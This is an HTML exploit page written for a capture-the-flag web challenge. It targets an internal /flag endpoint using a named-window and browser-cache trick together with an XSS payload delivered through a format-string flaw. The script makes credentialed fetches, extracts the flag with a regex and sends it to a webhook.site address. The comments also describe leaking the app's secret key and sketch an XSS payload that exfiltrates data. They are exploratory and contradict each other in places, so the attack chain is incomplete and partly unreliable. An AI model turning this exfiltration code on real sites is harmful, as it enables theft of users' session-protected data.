<!DOCTYPE html>
<html>
<head>
    <title>Exploit - Steal FLAG</title>
</head>
<body>
    <h1>Exploit Page</h1>
    <p>This page exploits the XSS vulnerability to steal the FLAG.</p>
    
    <script>
        // Attack strategy based on hints:
        // 1. CSRF 前先開好一個 named window (open named window before CSRF/XSS)
        // 2. XSS 後再去讀開好的 named window (read from named window after XSS)
        // 3. CSRF 前先讓想偷的 response 被瀏覽器 cache (cache response before CSRF)
        
        // Step 1: Open a named window to /flag
        // This will cache the /flag page response in the browser
        // According to the blog post, named windows persist across navigation
        // and the cached response can be accessed later
        console.log('Step 1: Opening named window to /flag...');
        var flagWindow = window.open('http://web:11202/flag', 'flagWindow');
        
        // Step 2: Wait for the page to load and be cached
        setTimeout(function() {
            console.log('Step 2: Page should be cached now');
            
            // Step 3: Now we need to trigger XSS on web:11202
            // The XSS vulnerability is in the flash message format string
            // We need to make bot visit a page that will trigger flash message with XSS payload
            
            // The XSS payload should use fetch with cache to read the cached /flag response
            // XSS payload: fetch('http://web:11202/flag',{cache:'only-if-cached',credentials:'include'}).then(r=>r.text()).then(t=>{var m=t.match(/<pre><code>([^<]+)<\/code><\/pre>/);if(m)fetch('https://webhook.site/YOUR-ID?flag='+encodeURIComponent(m[1]))})
            
            // But we need to inject this through the format string vulnerability
            // The format string is: msg.format(request=request)
            // Format string can read attributes but can't execute functions directly
            
            // However, if we can make format string read something that contains our payload,
            // and that payload gets inserted into the HTML, it might work
            
            // Actually, let's try a different approach:
            // We'll use the format string to read request attributes that might help us
            // But more importantly, we need to trigger the XSS
            
            // The key insight: We need to make bot navigate to a page that will:
            // 1. Trigger a flash message
            // 2. Flash message contains format string that reads something
            // 3. That something contains our XSS payload
            
            // But wait - we already have the format string vulnerability working!
            // We used it to leak the secret key: {request.scope[app].user_middleware}
            
            // For XSS, we need to inject JavaScript. But format string can't execute JS directly.
            // However, if we can make format string read an attribute that contains HTML/JS,
            // and that gets inserted into the page (which uses |safe), it might execute!
            
            // Let me think... The flash message uses |safe, so HTML is not escaped.
            // But the message itself is escaped before format string is applied.
            // So if format string reads something, it gets inserted as a string.
            
            // Actually, I think the approach should be:
            // 1. Cache /flag (done above)
            // 2. Navigate to a page that will trigger XSS
            // 3. XSS code uses fetch with cache to read /flag
            
            // But how do we trigger XSS? We need to use the format string.
            // Maybe we can use format string to read something that will be executed?
            
            // Wait! What if we use format string to read request.url or something,
            // and then inject that into a script tag or event handler?
            
            // Actually, let me try the simplest approach first:
            // Just use fetch with cache to read the cached /flag response
            // This should work if /flag is cached
            
            console.log('Step 3: Trying to read cached /flag response...');
            fetch('http://web:11202/flag', {
                method: 'GET',
                cache: 'only-if-cached',  // Only use cached version, fail if not cached
                credentials: 'include'    // Include cookies (bot's session)
            })
            .then(response => {
                console.log('Fetch response status:', response.status);
                if (response.status === 504) {
                    // Cache miss (504 Gateway Timeout means cache miss for only-if-cached)
                    console.log('Cache miss, trying force-cache...');
                    return fetch('http://web:11202/flag', {
                        method: 'GET',
                        cache: 'force-cache',  // Use cache if available
                        credentials: 'include'
                    });
                }
                return response;
            })
            .then(response => {
                if (!response.ok && response.status !== 504) {
                    throw new Error('Response not OK: ' + response.status);
                }
                return response.text();
            })
            .then(html => {
                console.log('Got HTML, extracting flag...');
                // Extract flag from HTML
                // Flag is in <pre><code>flag{...}</code></pre>
                var match = html.match(/<pre><code>([^<]+)<\/code><\/pre>/);
                if (match) {
                    var flag = match[1];
                    console.log('FLAG FOUND:', flag);
                    // Send flag to webhook (replace with your webhook URL)
                    // For testing, you can use https://webhook.site to get a unique URL
                    fetch('https://webhook.site/8e7ccc1c-b998-40ff-bc7f-14c432def363?flag=' + encodeURIComponent(flag))
                        .then(() => console.log('Flag sent to webhook'))
                        .catch(e => {
                            console.log('Could not send to webhook, flag is:', flag);
                            // Fallback: try to log it or display it
                            document.body.innerHTML += '<h2>FLAG: ' + flag + '</h2>';
                        });
                } else {
                    console.log('Flag not found in HTML');
                    console.log('HTML preview:', html.substring(0, 500));
                }
            })
            .catch(err => {
                console.error('Error fetching flag:', err);
                // If fetch fails, the cache might not be working
                // Or we need to trigger XSS first
                console.log('Need to trigger XSS to read the cached response');
            });
            
            // Also check if named window is accessible (won't work due to CORS, but worth trying)
            try {
                if (flagWindow && !flagWindow.closed) {
                    console.log('Named window still exists');
                    // Can't read content due to CORS, but window exists
                }
            } catch(e) {
                console.log('Cannot access named window (CORS):', e.message);
            }
        }, 3000); // Wait 3 seconds for page to load and cache
    </script>
</body>
</html>
